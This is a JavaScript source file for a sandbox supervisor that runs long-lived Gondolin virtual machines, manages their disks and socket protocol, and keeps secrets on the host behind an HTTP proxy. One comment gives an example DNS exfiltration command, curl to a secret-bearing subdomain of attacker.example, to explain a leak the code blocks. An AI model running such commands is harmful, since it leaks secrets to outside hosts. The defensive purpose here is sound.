// p2's sandbox program on a host environment: one long-lived Gondolin VM per sandbox, held by a supervisor process
// (`serve`), and the commands p2 runs over SSH (`daemon`, `start`, `status`, `stop`, `reset`, `forget`). `daemon` starts the supervisor
// when the sandbox is not running, then runs the pi-env daemon in the VM with stdin and stdout passed through, so p2
// talks to the daemon in the VM as it does to one on any other machine. Started by p2-sandbox.sh. Secrets: the
// configuration names them (with their hosts), `start` reads their values as JSON on stdin and hands them to the
// supervisor in its environment; the supervisor's HTTP proxy puts them into outbound request headers for their hosts,
// while the VM only sees placeholders.

import { execFileSync, spawn } from "node:child_process";
import { createHash } from "node:crypto";
import {
	closeSync,
	existsSync,
	mkdirSync,
	openSync,
	readFileSync,
	renameSync,
	rmSync,
	statSync,
	writeFileSync,
} from "node:fs";
import { connect, createServer } from "node:net";
import { homedir } from "node:os";
import { basename, dirname, isAbsolute, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import {
	createHttpHooks,
	ensureGuestAssets,
	ensureImageSelector,
	loadGuestAssets,
	ReadonlyProvider,
	RealFSProvider,
	VM,
} from "@earendil-works/gondolin";

/** How long a client waits for a starting sandbox: the first start downloads the guest image (about 200 MB). */
const START_TIMEOUT_MS = 600_000;
/** How long a stopping VM may take to write what it holds to its disk. */
const SYNC_TIMEOUT_MS = 30_000;
/** Where the pi-env daemon is copied in the VM, and where Gondolin mounts the folders before binding them. */
const GUEST_TOOLS = "/opt/pi-env";
const GUEST_VFS = "/.p2-vfs";
const GUEST_ENV = {
	HOME: "/root",
	PATH: "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
	LANG: "C.UTF-8",
};
/** Frames from the supervisor to a `daemon` client: type byte, 4-byte length, payload. */
const STDOUT = 1;
const STDERR = 2;
const EXIT = 3;

const self = fileURLToPath(import.meta.url);
/** The VM's name on this host: p2 passes `<installation>.<sandbox>`. */
const NAME = /^[a-z0-9][a-z0-9_.-]{0,63}$/;

await main(process.argv.slice(2));

async function main(args) {
	const [command, name, ...rest] = args;
	if (!NAME.test(name ?? "")) fail(`Invalid sandbox name: ${name}`);
	switch (command) {
		case "daemon": {
			// daemon NAME CONFIG BINARY -- ARGS...: the daemon's own arguments follow `--`.
			const [config, binary, separator, ...daemonArgs] = rest;
			if (separator !== "--" || !isAbsolute(binary ?? "")) fail("Usage: daemon NAME CONFIG BINARY -- ARGS...");
			return runDaemon(name, parseConfig(config), binary, daemonArgs);
		}
		case "start": {
			const config = parseConfig(rest[0]);
			await ensureRunning(name, config, config.secrets.length ? await readSecretValues(config) : {});
			return print(await request(name, { op: "status" }));
		}
		case "status":
			return print((await tryRequest(name, { op: "status" })) ?? { state: "stopped" });
		case "stop":
			return print((await tryRequest(name, { op: "stop" })) ?? { state: "stopped" });
		case "reset": {
			// A fresh disk at the next start: stop the VM, then remove its disk.
			const stopped = (await tryRequest(name, { op: "stop" })) ?? { state: "stopped" };
			rmSync(diskPath(name), { force: true });
			return print(stopped);
		}
		case "forget": {
			// The sandbox is being deleted: stop it, then remove its disk and run directory (its log) too.
			const stopped = (await tryRequest(name, { op: "stop" })) ?? { state: "stopped" };
			rmSync(diskPath(name), { force: true });
			rmSync(runDir(name), { recursive: true, force: true });
			return print(stopped);
		}
		case "serve":
			return serve(name, parseConfig(rest[0]));
		default:
			fail(`Unknown command: ${command}`);
	}
}

function fail(message) {
	process.stderr.write(`p2-sandbox: ${message}\n`);
	process.exit(2);
}

function print(value) {
	process.stdout.write(`${JSON.stringify(value)}\n`);
}

/** Secret values from stdin (`start`): a JSON object by secret name, one for each secret the configuration names. */
async function readSecretValues(config) {
	let text = "";
	for await (const chunk of process.stdin) text += chunk;
	let values;
	try {
		values = JSON.parse(text || "{}");
	} catch {
		fail("Invalid secret values on stdin");
	}
	for (const secret of config.secrets)
		if (typeof values?.[secret.name] !== "string") fail(`No value for secret ${secret.name}`);
	return values;
}

/** The sandbox configuration p2 passes as base64 JSON: image, folders, allowed hosts, resources, secrets (no values). */
function parseConfig(text) {
	let config;
	try {
		config = JSON.parse(Buffer.from(text ?? "", "base64").toString("utf8"));
	} catch {
		fail("Invalid sandbox configuration");
	}
	return {
		image: typeof config.image === "string" ? config.image : undefined,
		mounts: Array.isArray(config.mounts) ? config.mounts : [],
		// Always a list: Gondolin allows every host when it is omitted.
		allowHosts: Array.isArray(config.allowHosts) ? config.allowHosts.map(String) : [],
		cpus: Number.isInteger(config.cpus) ? config.cpus : undefined,
		memoryMb: Number.isInteger(config.memoryMb) ? config.memoryMb : undefined,
		diskGb: Number.isInteger(config.diskGb) ? config.diskGb : undefined,
		secrets: Array.isArray(config.secrets)
			? config.secrets.map((secret) => ({
					name: String(secret.name),
					hosts: Array.isArray(secret.hosts) ? secret.hosts.map(String) : [],
					aliases: Array.isArray(secret.aliases) ? secret.aliases.map(String) : [],
					gitHosts: Array.isArray(secret.gitHosts) ? secret.gitHosts.map(String) : [],
				}))
			: [],
		revision: createHash("sha256").update(text).digest("hex").slice(0, 16),
		raw: text,
	};
}

function runDir(name) {
	return join(homedir(), ".pi", "p2", "sandbox", "run", name);
}

/** The sandbox's own disk: a qcow2 layer over the guest image it was created from (the image stays its base). */
function diskPath(name) {
	return join(homedir(), ".pi", "p2", "sandbox", "disks", `${name}.qcow2`);
}

/**
 * The sandbox's disk, created at its first start (or after a reset) over the guest image, and grown to the configured
 * size (never shrunk).
 */
async function ensureDisk(name, config) {
	const disk = diskPath(name);
	if (!existsSync(disk)) await createDisk(disk, config);
	if (config.diskGb !== undefined) {
		const size = config.diskGb * 1024 ** 3;
		const info = JSON.parse(execFileSync("qemu-img", ["info", "--output=json", disk], { encoding: "utf8" }));
		if (info["virtual-size"] < size) execFileSync("qemu-img", ["resize", disk, String(size)], { stdio: "ignore" });
	}
	return disk;
}

/** A new qcow2 disk at `disk` over the guest image's root file system (the sandbox's image, else Gondolin's default). */
async function createDisk(disk, config) {
	const assets = config.image
		? loadGuestAssets((await ensureImageSelector(config.image)).assetDir)
		: await ensureGuestAssets();
	mkdirSync(dirname(disk), { recursive: true, mode: 0o700 });
	// Created under a temporary name: an interrupted start leaves no half-made disk behind.
	const temporary = `${disk}.${process.pid}.tmp`;
	const format = assets.rootfsPath.endsWith(".qcow2") ? "qcow2" : "raw";
	execFileSync("qemu-img", ["create", "-f", "qcow2", "-F", format, "-b", assets.rootfsPath, temporary], {
		stdio: "ignore",
	});
	renameSync(temporary, disk);
}

/**
 * `~` and `~/…` are the host user's home; other paths must be absolute. A writable folder must not hold or be inside
 * ~/.pi: p2 runs this launcher and pi-env's daemons from there, on the host.
 */
function hostPath(path, readonly) {
	const home = homedir();
	const expanded = path === "~" ? home : path.startsWith("~/") ? join(home, path.slice(2)) : path;
	if (!isAbsolute(expanded)) throw new Error(`Folder must be absolute or start with ~: ${path}`);
	const resolved = resolve(expanded);
	const within = (parent, child) => child === parent || child.startsWith(parent === "/" ? "/" : `${parent}/`);
	const pi = join(home, ".pi");
	if (!readonly && (within(resolved, pi) || within(pi, resolved)))
		throw new Error(`A writable folder must not contain or be inside ${pi} (p2's launcher runs from there): ${path}`);
	return resolved;
}

// --- Clients ---------------------------------------------------------------------------------------------------------

/** Connect to the supervisor's socket, or undefined when no supervisor listens. */
function tryConnect(name) {
	return new Promise((resolve) => {
		const socket = connect(join(runDir(name), "sock"));
		socket.once("connect", () => resolve(socket));
		socket.once("error", () => resolve(undefined));
	});
}

/** One JSON request and its JSON reply, or undefined when the sandbox is not running. */
async function tryRequest(name, message) {
	const socket = await tryConnect(name);
	if (!socket) return undefined;
	socket.write(`${JSON.stringify(message)}\n`);
	let text = "";
	for await (const chunk of socket) text += chunk;
	return JSON.parse(text);
}

async function request(name, message) {
	const reply = await tryRequest(name, message);
	if (reply === undefined) throw new Error(`Sandbox ${name} is not running`);
	return reply;
}

/**
 * Start the supervisor unless one listens, and wait until it does. A lock directory naming its owner keeps two
 * clients from starting two supervisors; the one that waits sees the other's socket, and takes over a lock whose owner
 * died. A start that times out stops its supervisor, so none is left booting without a lock.
 */
async function ensureRunning(name, config, secrets) {
	const existing = await tryConnect(name);
	if (existing) return existing.destroy();
	// Only `start` has the values: a supervisor started without them would run without its secrets.
	if (config.secrets.length && secrets === undefined)
		throw new Error(`Sandbox ${name} has secrets: start it with "start" first`);
	const dir = runDir(name);
	mkdirSync(dir, { recursive: true, mode: 0o700 });
	const lock = join(dir, "start.lock");
	const deadline = Date.now() + START_TIMEOUT_MS;
	for (;;) {
		try {
			mkdirSync(lock);
			writeFileSync(join(lock, "owner"), String(process.pid));
			break;
		} catch {
			let owner = 0;
			try {
				owner = Number(readFileSync(join(lock, "owner"), "utf8"));
			} catch {
				// Not written yet, or the lock is gone already.
			}
			// An owner that has not written its pid yet gets a moment.
			const age = Date.now() - (statSync(lock, { throwIfNoEntry: false })?.mtimeMs ?? Date.now());
			if (owner ? !alive(owner) : age > 5000) rmSync(lock, { recursive: true, force: true });
			const socket = await tryConnect(name);
			if (socket) return socket.destroy();
			if (Date.now() > deadline) throw new Error(`Sandbox ${name} did not start in time`);
			await sleep(250);
		}
	}
	try {
		const again = await tryConnect(name);
		if (again) return again.destroy();
		const log = join(dir, "log");
		const out = openSync(log, "w", 0o600);
		const child = spawn(process.execPath, [self, "serve", name, config.raw], {
			detached: true,
			stdio: ["ignore", out, out],
			// The values in the supervisor's environment (owner-only in /proc), never on its command line.
			env: { ...process.env, P2_SANDBOX_SECRETS: JSON.stringify(secrets ?? {}) },
		});
		closeSync(out);
		let exited = false;
		child.once("exit", () => {
			exited = true;
		});
		child.unref();
		process.stderr.write(`p2-sandbox: starting sandbox ${name}\n`);
		while (Date.now() < deadline) {
			const socket = await tryConnect(name);
			if (socket) return socket.destroy();
			if (exited) {
				const tail = readFileSync(log, "utf8").trim().split("\n").slice(-15).join("\n");
				throw new Error(`Sandbox ${name} failed to start:\n${tail}`);
			}
			await sleep(250);
		}
		child.kill("SIGTERM");
		throw new Error(`Sandbox ${name} did not start in time`);
	} finally {
		rmSync(lock, { recursive: true, force: true });
	}
}

/** Run the pi-env daemon in the VM: stdin goes to it, its stdout and stderr come back, its exit code is ours. */
async function runDaemon(name, config, binary, args) {
	try {
		await ensureRunning(name, config);
	} catch (error) {
		fail(error instanceof Error ? error.message : String(error));
	}
	const socket = await tryConnect(name);
	if (!socket) fail(`Sandbox ${name} stopped while connecting`);
	socket.write(`${JSON.stringify({ op: "exec", binary, args, revision: config.revision })}\n`);
	process.stdin.on("data", (chunk) => socket.write(chunk));
	process.stdin.on("end", () => socket.end());
	let buffer = Buffer.alloc(0);
	let code = 1;
	socket.on("data", (chunk) => {
		buffer = Buffer.concat([buffer, chunk]);
		while (buffer.length >= 5) {
			const length = buffer.readUInt32BE(1);
			if (buffer.length < 5 + length) break;
			const type = buffer[0];
			const payload = buffer.subarray(5, 5 + length);
			buffer = buffer.subarray(5 + length);
			if (type === STDOUT) process.stdout.write(payload);
			else if (type === STDERR) process.stderr.write(payload);
			else if (type === EXIT) code = JSON.parse(payload.toString("utf8")).code;
		}
	});
	socket.on("close", () => process.stdout.end(() => process.exit(code)));
	socket.on("error", () => {});
}

// --- Supervisor ------------------------------------------------------------------------------------------------------

/** Boot the VM, then serve requests on the socket until stopped; the process ends with the VM. */
async function serve(name, config) {
	const dir = runDir(name);
	const socketPath = join(dir, "sock");
	const mounts = {};
	for (const mount of config.mounts) {
		const host = hostPath(String(mount.host), mount.readonly === true);
		mkdirSync(host, { recursive: true });
		const real = new RealFSProvider(host);
		mounts[String(mount.guest)] = mount.readonly ? new ReadonlyProvider(real) : real;
	}
	const disk = await ensureDisk(name, config);
	const values = JSON.parse(process.env.P2_SANDBOX_SECRETS || "{}");
	delete process.env.P2_SANDBOX_SECRETS;
	const secrets = {};
	for (const secret of config.secrets) {
		if (typeof values[secret.name] !== "string") throw new Error(`No value for secret ${secret.name}`);
		secrets[secret.name] = { hosts: secret.hosts, value: values[secret.name] };
	}
	const { httpHooks, env } = createHttpHooks({
		allowedHosts: config.allowHosts,
		secrets,
		// Gondolin checks `allowedHosts` only after resolving the name on the host, which would leak any name the guest
		// asks for to DNS (`curl http://<secret>.attacker.example`); the request policy runs before that lookup.
		isRequestAllowed: (request) => allowedHost(new URL(request.url).hostname, config.allowHosts),
	});
	const vm = await VM.create({
		httpHooks,
		env: { ...GUEST_ENV, ...env, ...secretHelpers(config.secrets, env) },
		// Gondolin's own mount point, out of the way of the folders (its default is /data).
		vfs: { mounts, fuseMount: GUEST_VFS },
		...(config.cpus === undefined ? {} : { cpus: config.cpus }),
		...(config.memoryMb === undefined ? {} : { memory: `${config.memoryMb}M` }),
		// The sandbox's own disk, kept across restarts.
		sandbox: {
			...(config.image === undefined ? {} : { imagePath: config.image }),
			rootDiskPath: disk,
			rootDiskFormat: "qcow2",
			rootDiskDeleteOnClose: false,
		},
		// Only /tmp stays in memory: the home and caches live on the disk, so what is installed there stays too.
		tmpfs: { "/tmp": {} },
		sessionLabel: `p2:${name}`,
	});
	await vm.exec("true");
	// The disk outlives the VM, and a VM can end without unmounting (a crash, a host reboot): a journal makes the next
	// mount recover (the guest image's file system has none). Then the file system grows to the disk's size, once
	// mounted: not with Gondolin's `rootfs.size`, which runs resize2fs while the guest may still be mounting it.
	await vm.exec("tune2fs -l /dev/vda | grep -q has_journal || tune2fs -O has_journal /dev/vda >/dev/null 2>&1");
	if (config.diskGb !== undefined) await vm.exec("resize2fs /dev/vda >/dev/null 2>&1");
	// Both change the file system's structure, which the journal does not cover until it is on the disk.
	await vm.exec("sync");
	const startedAt = Date.now();
	/** The daemons copied into the VM, by guest path: one copy each, however many connections ask at once. */
	const installs = new Map();
	let server;
	let closing;
	/**
	 * Stop: no new connections first (the socket goes, so the next client starts a new supervisor), then the VM. The
	 * run directory stays: a new supervisor may already be starting in it.
	 */
	const close = () => {
		closing ??= (async () => {
			clearInterval(watch);
			server?.close();
			rmSync(socketPath, { force: true });
			// Gondolin ends QEMU without the guest unmounting: what the guest still holds in memory reaches the disk first.
			await Promise.race([vm.exec("sync"), sleep(SYNC_TIMEOUT_MS)]).catch(() => {});
			await vm.close().catch(() => {});
		})();
		return closing;
	};
	const exit = () => void close().then(() => process.exit(0));
	// Gondolin does not close a VM whose QEMU died: without this the supervisor would answer as running forever.
	const watch = setInterval(() => {
		const pid = vm.getHostPid();
		if (pid !== null && alive(pid)) return;
		console.log(`sandbox ${name}: the VM exited`);
		exit();
	}, 2000);
	process.on("SIGTERM", exit);
	process.on("SIGINT", exit);
	const status = () => ({
		state: "running",
		startedAt,
		revision: config.revision,
		pid: process.pid,
		cpus: config.cpus ?? 2,
		memoryMb: config.memoryMb ?? 1024,
	});
	server = createServer((socket) => {
		socket.on("error", () => {});
		let header = Buffer.alloc(0);
		const onData = (chunk) => {
			header = Buffer.concat([header, chunk]);
			const end = header.indexOf(10);
			if (end < 0) return;
			socket.off("data", onData);
			// Input that arrives while the daemon is copied into the VM waits in the socket.
			socket.pause();
			const rest = header.subarray(end + 1);
			let message;
			try {
				message = JSON.parse(header.subarray(0, end).toString("utf8"));
			} catch {
				return socket.destroy();
			}
			if (message.op === "status") return socket.end(JSON.stringify(status()));
			// Answered once the VM is gone, so a start right after never finds this supervisor.
			if (message.op === "stop")
				return void close().then(() => socket.end(JSON.stringify({ state: "stopped" }), () => process.exit(0)));
			if (message.op === "exec") return void execute(vm, installs, message, socket, rest, config.revision);
			socket.destroy();
		};
		socket.on("data", onData);
	});
	rmSync(socketPath, { force: true });
	server.listen(socketPath, () => console.log(`sandbox ${name} running (pid ${process.pid})`));
}

/**
 * More variables for the secrets' placeholders: aliases (`GH_TOKEN` beside `GITHUB_TOKEN`) and a git credential helper
 * per git host, through `GIT_CONFIG_*` (git 2.31 or newer), so nothing is written in the VM.
 */
function secretHelpers(secrets, env) {
	const extra = {};
	const git = [];
	for (const secret of secrets) {
		const placeholder = env[secret.name];
		if (placeholder === undefined) continue;
		for (const alias of secret.aliases) extra[alias] = placeholder;
		for (const host of secret.gitHosts)
			git.push([
				`credential.https://${host}.helper`,
				`!f() { test "$1" = get && echo username=x-access-token && echo "password=$${secret.name}"; }; f`,
			]);
	}
	if (git.length) {
		extra.GIT_CONFIG_COUNT = String(git.length);
		git.forEach(([key, value], index) => {
			extra[`GIT_CONFIG_KEY_${index}`] = key;
			extra[`GIT_CONFIG_VALUE_${index}`] = value;
		});
	}
	return extra;
}

/** Gondolin's host pattern rules: case-insensitive, `*` alone matches any host, `*` inside a pattern any substring. */
function allowedHost(hostname, patterns) {
	return patterns.some((raw) => {
		const pattern = raw.trim().toLowerCase();
		if (pattern === "*") return true;
		const escaped = pattern
			.split("*")
			.map((part) => part.replace(/[.+?^${}()|[\]\\]/g, "\\$&"))
			.join(".*");
		return pattern !== "" && new RegExp(`^${escaped}$`, "i").test(hostname);
	});
}

function frame(type, payload) {
	const head = Buffer.alloc(5);
	head[0] = type;
	head.writeUInt32BE(payload.length, 1);
	return Buffer.concat([head, payload]);
}

/** Copy the daemon into the VM once per content, then run it with the client's stdin and output. */
async function execute(vm, installs, message, socket, firstInput, revision) {
	const send = (type, payload) => {
		if (!socket.destroyed) socket.write(frame(type, payload));
	};
	const abort = new AbortController();
	// The client went away (ssh closed), also while the daemon is still being copied: the daemon stops with it.
	socket.on("close", () => abort.abort());
	try {
		if (message.revision !== revision)
			send(STDERR, Buffer.from("p2-sandbox: the configuration changed; it applies when the sandbox restarts\n"));
		const guest = `${GUEST_TOOLS}/${basename(String(message.binary))}`;
		let install = installs.get(guest);
		if (!install) {
			install = (async () => {
				await vm.fs.mkdir(GUEST_TOOLS, { recursive: true });
				await vm.fs.writeFile(guest, readFileSync(String(message.binary)));
				// The array form runs the program itself: Gondolin does not search PATH for it.
				const chmod = await vm.exec(["/bin/chmod", "755", guest]);
				if (chmod.exitCode !== 0) throw new Error(`Could not make the daemon executable: ${chmod.stderr.trim()}`);
			})();
			installs.set(guest, install);
			// A failed copy is tried again by the next connection.
			install.catch(() => installs.delete(guest));
		}
		await install;
		if (abort.signal.aborted) return;
		const proc = vm.exec([guest, ...message.args.map(String)], {
			stdin: true,
			stdout: "pipe",
			stderr: "pipe",
			cwd: "/",
			signal: abort.signal,
		});
		if (firstInput.length) proc.write(firstInput);
		socket.on("data", (chunk) => proc.write(chunk));
		socket.on("end", () => proc.end());
		socket.resume();
		proc.stdout?.on("data", (chunk) => send(STDOUT, chunk));
		proc.stderr?.on("data", (chunk) => send(STDERR, chunk));
		const result = await proc.result;
		send(EXIT, Buffer.from(JSON.stringify({ code: result.exitCode })));
	} catch (error) {
		if (!abort.signal.aborted) {
			send(STDERR, Buffer.from(`p2-sandbox: ${error instanceof Error ? error.message : String(error)}\n`));
			send(EXIT, Buffer.from(JSON.stringify({ code: 1 })));
		}
	}
	socket.end();
}

/** Whether process `pid` exists. */
function alive(pid) {
	try {
		process.kill(pid, 0);
		return true;
	} catch (error) {
		return error.code === "EPERM";
	}
}

function sleep(ms) {
	return new Promise((resolve) => setTimeout(resolve, ms));
}
